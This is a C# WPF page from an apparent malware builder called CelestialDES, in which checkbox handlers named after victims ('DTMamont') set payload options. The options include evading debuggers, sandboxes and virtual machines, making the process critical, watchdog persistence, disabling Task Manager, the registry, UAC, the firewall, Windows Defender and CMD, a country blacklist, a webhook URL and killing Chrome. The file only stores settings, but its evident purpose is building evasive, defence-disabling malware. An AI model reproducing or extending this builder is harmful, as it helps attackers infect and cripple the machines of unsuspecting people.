using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace CelestialDES.Pages.BuilderPages
{
    /// <summary>
    /// Логика взаимодействия для Misc.xaml
    /// </summary>
    public partial class Misc : Page
    {
        public Misc()
        {
            InitializeComponent();
        }

        private void ComboBox_DropDownClosed(object sender, EventArgs e)
        {
            string fullpath = Environment.ExpandEnvironmentVariables(cmbSelect.Text) + "\\" + filename.Text;
            Fullpath.Text = fullpath;
            Fullpath.Visibility = Visibility.Visible;
            Setting.watchdogfolder = cmbSelect.Text;
            if (cmbSelect.SelectedIndex == 3 || cmbSelect.SelectedIndex == 4) //sel ind already updated
            {
                // change sel Index of other Combo for example
                admrightpath.Visibility = Visibility.Visible;
            }
            else { admrightpath.Visibility = Visibility.Hidden; }
        }

        private void cmbSelect_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            string fullpath = Environment.ExpandEnvironmentVariables(cmbSelect.Text) + "\\" + filename.Text;
            Fullpath.Text = fullpath;
            Fullpath.Visibility = Visibility.Visible;
            if (cmbSelect.SelectedIndex == 3 || cmbSelect.SelectedIndex == 4) //sel ind already updated
            {
                // change sel Index of other Combo for example
                admrightpath.Visibility = Visibility.Visible;
            }
            else { admrightpath.Visibility = Visibility.Hidden; }
        }

        private void FolderText_KeyDown(object sender, KeyEventArgs e)
        {
            string fullpath = Environment.ExpandEnvironmentVariables(cmbSelect.Text) + "\\" + filename.Text;
            Fullpath.Text = fullpath;
            Setting.watchdogname = filename.Text;
        }

        private void DTMamont_Checked(object sender, RoutedEventArgs e)
        {
            Setting.DetectXP = "true";
        }

        private void DTMamont_Unchecked(object sender, RoutedEventArgs e)
        {
            Setting.DetectXP = "false";
        }
        private void DTMamont1_Checked(object sender, RoutedEventArgs e)
        {
            Setting.DetectDebugger = "true";
        }

        private void DTMamont1_Unchecked(object sender, RoutedEventArgs e)
        {
            Setting.DetectDebugger = "false";
        }
        private void DTMamont2_Checked(object sender, RoutedEventArgs e)
        {
            Setting.DetectSandboxie = "true";
        }

        private void DTMamont2_Unchecked(object sender, RoutedEventArgs e)
        {
            Setting.DetectSandboxie = "false";
        }

        private void DTMamont3_Checked(object sender, RoutedEventArgs e)
        {
            Setting.DetectSmallDisk = "true";
        }

        private void DTMamont3_Unchecked(object sender, RoutedEventArgs e)
        {
            Setting.DetectSmallDisk = "false";
        }

        private void DTMamont41_Checked(object sender, RoutedEventArgs e)
        {
            Setting.DetectVirtualEnviroment = "true";
        }

        private void DTMamont41_Unchecked(object sender, RoutedEventArgs e)
        {
            Setting.DetectVirtualEnviroment = "false";
        }

        private void ProcessCrit_Checked(object sender, RoutedEventArgs e)
        {
            Setting.CritProcess = "true";
        }

        private void ProcessCrit_Unchecked(object sender, RoutedEventArgs e)
        {
            Setting.CritProcess = "false";
        }

        private void Watchdog_Checked(object sender, RoutedEventArgs e)
        {
            Setting.needwatchdog = "true";
        }

        private void Watchdog_Unchecked(object sender, RoutedEventArgs e)
        {
            Setting.needwatchdog = "false";
        }

        private void DTMamont4_Checked(object sender, RoutedEventArgs e)
        {
            Setting.DisableTaskMGR = "true";
        }

        private void DTMamont4_Unchecked(object sender, RoutedEventArgs e)
        {
            Setting.DisableTaskMGR = "false";
        }

        private void DTMamont5_Checked(object sender, RoutedEventArgs e)
        {
            Setting.DisableRegistry = "true";
        }

        private void DTMamont5_Unchecked(object sender, RoutedEventArgs e)
        {
            Setting.DisableRegistry = "false";
        }

        private void DTMamont6_Checked(object sender, RoutedEventArgs e)
        {
            Setting.DisableUAC = "true";
        }

        private void DTMamont6_Unchecked(object sender, RoutedEventArgs e)
        {
            Setting.DisableUAC = "false";
        }

        private void DTMamont7_Checked(object sender, RoutedEventArgs e)
        {
            Setting.DisableFirewall = "true";
        }

        private void DTMamont7_Unchecked(object sender, RoutedEventArgs e)
        {
            Setting.DisableFirewall = "false";
        }

        private void DTMamont8_Checked(object sender, RoutedEventArgs e)
        {
            Setting.DisableWinDef = "true";
        }

        private void DTMamont8_Unchecked(object sender, RoutedEventArgs e)
        {
            Setting.DisableWinDef = "false";
        }

        private void DTMamont9_Checked(object sender, RoutedEventArgs e)
        {
            Setting.DisableCMD = "true";
        }

        private void DTMamont9_Unchecked(object sender, RoutedEventArgs e)
        {
            Setting.DisableCMD = "false";
        }

        private void DTMamont10_Checked(object sender, RoutedEventArgs e)
        {
            Setting.CBlack = "true";
        }

        private void DTMamont10_Unchecked(object sender, RoutedEventArgs e)
        {
            Setting.CBlack = "false";
        }

        private void DTMamont11_Checked(object sender, RoutedEventArgs e)
        {
            Setting.needweb = "true";
        }

        private void DTMamont11_Unchecked(object sender, RoutedEventArgs e)
        {
            Setting.needweb = "false";
        }

        private void DTMamont13_Checked(object sender, RoutedEventArgs e)
        {
            Setting.DisableRun = "true";
        }

        private void DTMamont13_Unchecked(object sender, RoutedEventArgs e)
        {
            Setting.DisableRun = "false";
        }

        private void DTMamont14_Checked(object sender, RoutedEventArgs e)
        {
            Setting.DisableWinKeys = "true";
        }

        private void DTMamont14_Unchecked(object sender, RoutedEventArgs e)
        {
            Setting.DisableWinKeys = "false";
        }

        private void TextBox_TextChanged(object sender, TextChangedEventArgs e)
        {
            Setting.CBlacklist = BListText.Text;
        }

        private void Page_IsVisibleChanged(object sender, DependencyPropertyChangedEventArgs e)
        {
            DetectXP.IsChecked = Convert.ToBoolean(Setting.DetectXP);
            Detectdbg.IsChecked = Convert.ToBoolean(Setting.DetectDebugger);
            DetectSand.IsChecked = Convert.ToBoolean(Setting.DetectSandboxie);
            Detectsmall.IsChecked = Convert.ToBoolean(Setting.DetectSmallDisk);

            CritPro.IsChecked = Convert.ToBoolean(Setting.CritProcess);

            Watchdog.IsChecked = Convert.ToBoolean(Setting.needwatchdog);
            cmbSelect.Text = Setting.watchdogfolder;
            filename.Text = Setting.watchdogname;

            DisableTask.IsChecked = Convert.ToBoolean(Setting.DisableTaskMGR);
            DisableReg.IsChecked = Convert.ToBoolean(Setting.DisableRegistry);
            DisableUAC.IsChecked = Convert.ToBoolean(Setting.DisableUAC);
            DisableWall.IsChecked = Convert.ToBoolean(Setting.DisableFirewall);
            DisableWinDef.IsChecked = Convert.ToBoolean(Setting.DisableWinDef);
            DisableCommand.IsChecked = Convert.ToBoolean(Setting.DisableCMD);
            DisableRun.IsChecked = Convert.ToBoolean(Setting.DisableRun);
            DisableWinKeys.IsChecked = Convert.ToBoolean(Setting.DisableWinKeys);

            CountryBList.IsChecked = Convert.ToBoolean(Setting.CBlack);
            BListText.Text = Setting.CBlacklist;

            AutoRecovery.IsChecked = Convert.ToBoolean(Setting.needweb);
            AutoRecWebhookUrl.Text = Setting.weburl;

            DetectsVirtual.IsChecked = Convert.ToBoolean(Setting.DetectVirtualEnviroment);
        }

        private void AutoRecWebhookUrl_KeyDown(object sender, KeyEventArgs e)
        {
            Setting.weburl = AutoRecWebhookUrl.Text;
        }

        private void AutoRecWebhookUrl_KeyUp(object sender, KeyEventArgs e)
        {
            Setting.weburl = AutoRecWebhookUrl.Text;
        }

        private void DTMamont12_Checked(object sender, RoutedEventArgs e)
        {
            Setting.chromekill = "true";
        }

        private void DTMamont12_Unchecked(object sender, RoutedEventArgs e)
        {
            Setting.chromekill = "false";
        }
    }
}
